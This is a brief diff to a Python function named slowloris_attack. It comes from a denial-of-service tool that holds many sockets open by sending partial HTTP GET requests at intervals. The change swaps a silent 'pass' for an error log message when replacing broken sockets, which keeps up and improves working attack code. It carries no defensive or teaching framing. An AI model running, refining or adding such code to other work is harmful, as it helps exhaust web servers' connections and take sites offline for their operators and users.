@@ -101,7 +101,7 @@ def slowloris_attack():
                         new_socket.send(f"GET /?{random_string(5)} HTTP/1.1\r\n".encode())
                         sockets_list.append(new_socket)
                     except socket.error:
-                        pass
+                        logger.error("Failed to replace broken socket.")
                         
             # Wait before sending more partial headers
             time.sleep(10)
